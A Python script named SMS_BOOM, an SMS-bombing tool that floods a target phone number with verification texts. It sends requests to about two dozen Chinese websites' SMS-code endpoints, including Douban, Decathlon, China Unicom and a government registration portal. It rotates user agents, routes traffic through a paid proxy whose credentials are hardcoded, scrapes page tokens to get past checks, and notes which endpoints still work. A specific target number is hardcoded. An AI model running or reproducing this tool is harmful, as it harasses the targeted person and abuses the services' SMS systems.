import requests
from fake_useragent import UserAgent
import time
import re
import json


class SMS_BOOM():
    def __init__(self,phoneNumber):
        self.phoneNumber=phoneNumber
        self.headers={"User-Agent": UserAgent().random}
        self.UA="Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:68.0) Gecko/20100101 Firefox/68.0"

        proxyHost = "http-pro.abuyun.com"
        proxyPort = "9010"
        proxyUser = "HZ7628414HP9GJ5P"
        proxyPass = "75A73EAC47469267"
        proxyMeta = "http://%(user)s:%(pass)s@%(host)s:%(port)s" % {
            "host": proxyHost,
            "port": proxyPort,
            "user": proxyUser,
            "pass": proxyPass,
        }
        self.proxies = {
            "http": proxyMeta,
            "https": proxyMeta,
        }

    def start_function(self):
        self.output_function(self.xiaomai5())#小麦助教，成功
        self.output_function(self.shijiebang())#世界邦，成功
        self.output_function(self.facebank())#笑脸金融，成功
        self.output_function(self.itjuzi())#IT橘子，成功
        self.output_function(self.cta613())#中华支教，成功
        self.output_function(self.dikanong()) #成功
        self.output_function(self.zongheng())#成功
        self.output_function(self.jidongche())#机动车，成功，（注意cookie，是否会过期）
        self.output_function(self.shijiejingliren())#世界经理人，失败，动态验证码，稍后攻克
        self.output_function(self.qingnianzhisheng())#失败，bug：提交方法不正确
        self.output_function(self.tianjinqiyedengji())#失败，bug：morecount
        self.output_function(self.yifatong()) #失败，找不到页面
        self.output_function(self.juren()) #失败，操作过于频繁
        self.output_function(self.jinronghao()) #失败，未知错误
        self.output_function(self.juhe())#失败，未知错误
        self.output_function(self.ruanmei())#失败，未知错误
        self.output_function(self.maifupay())#失败，未知错误
        self.output_function(self.cnmo())#失败，验证码发送失败
        self.output_function(self.douban())#成功
        self.output_function(self.tianya())#失败，需要验证码
        self.output_function(self.shumazhijia())#失败，未知错误
        self.output_function(self.tunshitiandi())#失败，未知错误
        self.output_function(self.qiyeguanlipingtai())#失败，未知错误
        self.output_function(self.liantong())#成功
        self.output_function(self.tiaoyue())#成功

    def output_function(self,func):
        name,status_code,text=func
        print(name,"：",status_code,text)

    def xiaomai5(self):
        name="小麦助教"
        response=requests.post(url='https://api-b.xiaomai5.com/b/send/authcode?p=w',
                               data={'phone':self.phoneNumber},headers=self.headers,
                               proxies=self.proxies)
        return name,response.status_code,response.text

    def shijiebang(self):
        name="世界邦"
        response=requests.get(url=f'http://www.shijiebang.com/a/mobile/vcode/?key={self.phoneNumber}',
                              # data={'key': self.phoneNumber},
                              headers={"User-Agent": UserAgent().random,
                                       "X-Requested-With": "XMLHttpRequest",
                                       "Referer": "http://www.shijiebang.com/reg/"},
                              proxies=self.proxies)
        return name,response.status_code,response.text

    def facebank(self):
        name="笑脸金融"
        response=requests.post(url="https://cic.facebank.cn/wap/getLoginSmsCode",data={"mobile": self.phoneNumber},
                               headers=self.headers,proxies=self.proxies)
        return name,response.status_code, response.text

    def itjuzi(self):
        name="IT橘子"
        response=requests.post(url="https://www.itjuzi.com/api/verificationCodes",data={"account":self.phoneNumber},
                               headers=self.headers,proxies=self.proxies)
        return name,response.status_code, response.text

    def cta613(self):
        name="中华支教网"
        response=requests.post(url="http://www.cta613.org/sendsms.php",data={"y":1,"sj":self.phoneNumber},
                               headers=self.headers,proxies=self.proxies)
        return name,response.status_code, response.text

    def dikanong(self):
        name="迪卡侬"
        response=requests.post(url='https://www.decathlon.com.cn/zh/ajax/rest/model/atg/userprofiling/ProfileActor/send-mobile-verification-code',
                      data={"countryCode":"CN","mobile":self.phoneNumber},
                      headers={"User-Agent": UserAgent().random,"Referer": "https://www.decathlon.com.cn/zh/create"},
                               proxies=self.proxies)
        return name,response.status_code, response.text

    def zongheng(self):
        name="纵横中文网"
        response=requests.get("https://passport.zongheng.com/webreg")
        re_ma=re.match(".*?var TK.*?=(.*?);.*?var captKey =(.*?);",response.text,re.S)
        sth1=re_ma.group(1).replace(" ", "").replace("\"", "")
        sth2=re_ma.group(2).replace(" ", "").replace("\"", "")
        response_detail=requests.post(url="https://passport.zongheng.com/sendregsms.do",
                                      data={"tk":sth1,"captkey":sth2,"phone":self.phoneNumber,"capt":""},
                                      proxies=self.proxies)
        return name,response_detail.status_code,response_detail.text

    def jidongche(self):
        name="机动车手机注册"
        response=requests.post(url="http://www.ntjxj.com/InternetWeb/SendYzmServlet",data={"sjhm" : self.phoneNumber},
                               headers={"Referer":"http://www.ntjxj.com/InternetWeb/regHphmToTel.jsp",
                                        "User-Agent": UserAgent().random,
                                        "X-Requested-With":"XMLHttpRequest",
                                        "Host":"www.ntjxj.com",
                                        "Cookie":"JSESSIONID=4D17AF4DDFBB6117C39C6ABDC6F08C89"
                                        },
                               proxies=self.proxies)
        return name,response.status_code, response.text

    def shijiejingliren(self):
        name="世界经理人"
        response=requests.post(url="https://login.ceconline.com/thirdPartLogin.do",
                               data={"mobileNumber":self.phoneNumber,"method": "getDynamicCode",
                                     "verifyType": "MOBILE_NUM_REG","captcharType":"","time": str(int(time.time()*1000))},
                               headers=self.headers,
                               proxies=self.proxies)
        return name,response.status_code, response.text

    def qingnianzhisheng(self):
        name="青年之声"
        response=requests.post(url="http://sns.qnzs.youth.cn/ajax/passportSendSms",data={"mobile" : self.phoneNumber},
                               headers={"Referer":"http://sns.qnzs.youth.cn/user/passport",
                                        "User-Agent": UserAgent().random,
                                        "Host":"sns.qnzs.youth.cn"},
                               proxies=self.proxies)
        return name,response.status_code, response.text

    def tianjinqiyedengji(self):
        name="天津市企业登记"
        response=requests.post(url="http://qydj.scjg.tj.gov.cn/reportOnlineService/login_login",data={"MOBILENO" : self.phoneNumber,'TEMP': 1},
                               headers={"User-Agent": UserAgent().random,
                                        "Host":"qydj.scjg.tj.gov.cn",
                                        "Referer":"http://qydj.scjg.tj.gov.cn/reportOnlineService/",
                                        "X-Requested-With":"XMLHttpRequest"},
                               proxies=self.proxies)
        return name,response.status_code, response.text

    def yifatong(self):
        name="易法通"
        response=requests.get(url=f'http://yifatong.com/Customers/gettcode?rnd={round(time.time(),3)}&mobile={self.phoneNumber}',
                      headers={"User-Agent": UserAgent().random,
                               "Referer": "http://yifatong.com/Customers/registration?url=",
                               "Host":"yifatong.com",
                               "X-Requested-With":"XMLHttpRequest"},
                              proxies=self.proxies)
        return name,response.status_code, response.text

    def juren(self):
        name="巨人网络"
        response=requests.get(url=f'http://reg.ztgame.com/common/sendmpcode?source=giant_site&nonce=&type=verifycode&token=&refurl=&cururl=http%3A%2F%2Freg.ztgame.com%2F&phone={self.phoneNumber}&mpcode=&pwd=&tname=&idcard=',
                            headers={"User-Agent": UserAgent().random,"Referer": "http://reg.ztgame.com/","Host":"reg.ztgame.com",
                                     "X-Requested-With":"XMLHttpRequest"},
                              proxies=self.proxies)
        return name,response.status_code, response.text

    def jinronghao(self):
        name="金融号"
        response=requests.get(url=f'http://jrh.financeun.com/Login/sendMessageCode3.html?mobile={self.phoneNumber}&mbid=197861',
                      headers={"User-Agent": UserAgent().random,"Referer": "http://jrh.financeun.com/Login/jrwLogin?web=jrw",
                               "Host":"jrh.financeun.com","X-Requested-With":"XMLHttpRequest"},
                              proxies=self.proxies)
        return name,response.status_code, response.text

    def juhe(self):
        name="聚合数据"
        headers={"User-Agent": self.UA,"X-Requested-With":"XMLHttpRequest",
                 "Referer":"https://www.juhe.cn/register","Host":"www.juhe.cn"}
        response=requests.get("https://www.juhe.cn/register",headers=headers)
        re_ma= re.match(".*?sendsms', {(.*?)':.*?this.mobile.val(.*?)':.*?this.username.val.*?", response.text, re.S)
        sth1=re_ma.group(1).replace(" ", "").replace("$", "", ).replace("'", "").replace("\n", "")
        sth2=re_ma.group(2).replace(" ", "").replace("$", "", ).replace("'", "").replace(",", "").replace("()", "").replace("\n", "")
        response_detail=requests.post(url="https://www.juhe.cn/sendsms",data={sth1:self.phoneNumber,sth2:"yupipi824"},headers=headers,
                                      proxies=self.proxies)
        return name,response_detail.status_code,response_detail.text

    def ruanmei(self):
        name="软媒"
        response=requests.get("http://my.ruanmei.com/")
        re_ma=re.match(".*?id=\"data20190202\" value='(.*?)' />.*?",response.text,re.S)
        sth=re_ma.group(1)
        response_detail=requests.post(url="http://my.ruanmei.com/Default.aspx/SendSmsReg20190319",
                                      data={"mobile":self.phoneNumber,
                                            "checkreg":"true",
                                            "validate":"",
                                            "data":sth
                                            },
                                      proxies=self.proxies)
        return name,response_detail.status_code,response_detail.text

    def maifupay(self):
        name="麦付宝"
        response = requests.get("https://www.maifupay.com/register")
        re_ma = re.match(".*?name=\"_token\" value=\"(.*?)\">*?", response.text, re.S)
        sth=re_ma.group(1)
        response_detail=requests.post(url="https://www.maifupay.com/auth/verify-code",
                                      data={"_token":sth,"seconds":"60","mobile":self.phoneNumber,"type":"1"},
                                      headers={"User-Agent": self.UA,
                 "X-Requested-With":"XMLHttpRequest",
                 "Referer":"https://www.maifupay.com/register",
                 "Host":"www.maifupay.com"},
                                      proxies=self.proxies)
        print(response_detail.text)
        return name,response_detail.status_code,response_detail.text

    #验证码发送失败
    def cnmo(self):
        name="手机中国"
        response = requests.get("http://passport.cnmo.com/register/?backurl=http://www.cnmo.com/")
        re_ma = re.match(".*?input type=\"hidden\" value=\"(.*?)\" id=\"token\" />", response.text, re.S)
        sth=re_ma.group(1)
        time.sleep(3)
        response_detail=requests.post(url="http://passport.cnmo.com/index.php?c=Member_Ajax_Register&m=SendMessageCode",
                      data={"mobile": self.phoneNumber,"token": sth, "type":1},
                      headers={"User-Agent": UserAgent().random,"Host": "passport.cnmo.com",
                               "Referer": "http://passport.cnmo.com/register/","X-Requested-With": "XMLHttpRequest"},
                                      proxies=self.proxies)
        return name,response_detail.status_code, response_detail.text

    def douban(self):
        name="豆瓣"
        response=requests.post(url="https://accounts.douban.com/j/mobile/login/request_phone_code",
                               data={"ck":"","area_code":"+86","number":self.phoneNumber},
                               proxies=self.proxies)
        return name,response.status_code,response.text

    def tianya(self):
        name="天涯社区"
        response=requests.get(url=f"https://passport.tianya.cn/register/sendSmsCode.do?mobile={self.phoneNumber}&userName={self.phoneNumber}&token=",
                              headers={"X-Requested-With": "XMLHttpRequest",
                                    "User-Agent":self.UA,
                                    "Referer":"https://passport.tianya.cn/register/default.jsp?fowardURL=",
                                    "Host":"passport.tianya.cn"},
                              proxies=self.proxies)
        return name,response.status_code,response.text

    def shumazhijia(self):
        name="数码之家"
        response=requests.post(url="http://bbs.mydigit.cn/registe.php",
                               data={"action": "auth","step": "1","mobile": self.phoneNumber},
                               headers={"Referer": "http://bbs.mydigit.cn/registe.php",
                                        'User-Agent':self.UA,},
                               proxies=self.proxies)
        return name,response.status_code,response.text

    def tunshitiandi(self):
        name="吞食天地"
        params = {'Nationcode': '86', 'phone': f'{self.phoneNumber}', 'UserID': '邮箱作为找回密码途径 ,请正确填写'}
        url = "http://tsmember.online-game.com.cn/ajaxpro/TsMember.TsRegister,TsMember.ashx"
        response = requests.post(url=url, data=json.dumps(params),
                            headers={"User-Agent": self.UA,
                                     "Referer":"http://tsmember.online-game.com.cn/TSRegister.aspx",
                                     "Host":"tsmember.online-game.com.cn"},
                                 proxies=self.proxies)
        return name,response.status_code,response.text

    def qiyeguanlipingtai(self):
        name="企业管理平台"
        payload_data={"mobile": self.phoneNumber}
        response=requests.post(url="https://ems.xg-yc.com/ent/sendMobileCode",
                               data=json.dumps(payload_data),
                               headers={"User-Agent": self.UA,
                                        "X-Requested-With":"XMLHttpRequest",
                                        "Referer":"https://ems.xg-yc.com/",
                                        "Host":"ems.xg-yc.com"},
                               proxies=self.proxies)
        return name,response.status_code,response.text

    def liantong(self):
        name="中国联通"
        res=requests.get(url=f"http://uac.10010.com/oauth2/OpSms?callback=jsonp{int(time.time()*1000)}&req_time={int(time.time()*1000)}&user_id={self.phoneNumber}&app_code=MOBILE_MALL",
                     headers={"User-Agent":self.UA,
                              "X-Requested-With": "XMLHttpRequest",
                              "Host": "uac.10010.com",
                              },
                         proxies=self.proxies)
        return name,res.status_code,res.text

    def tiaoyue(self):
        name="跳跃网络"
        response=requests.get(url="https://passport.jumpw.com/views/register.jsp",
                              headers={"User-Agent":self.UA})
        a=re.match('.*?serviceCode" value="(.*?)" /><input type="hidden" id="XKey".*?',response.text,re.S).group(1)
        print(a)
        a=int(a)+1
        response_detail=requests.post(url="https://passport.jumpw.com/UserManager.do",
                                      data={"serviceCode":a,
                                            "Phonestr":self.phoneNumber},
                                      headers={
                                          "User-Agent": self.UA,
                                          "Referer":"https://passport.jumpw.com/views/register.jsp",
                                          "Host":"passport.jumpw.com"
                                      },
                                      proxies=self.proxies)
        return name,response_detail.status_code,response_detail.text

#千米，需要验证码，图像识别后处理，https://www.qianmi.com/
if __name__ == '__main__':
    #13093367227    #18519920830
    # number=input("输入要轰炸的对象：")
    number="18785901078"
    sms_boom=SMS_BOOM(number)
    sms_boom.start_function()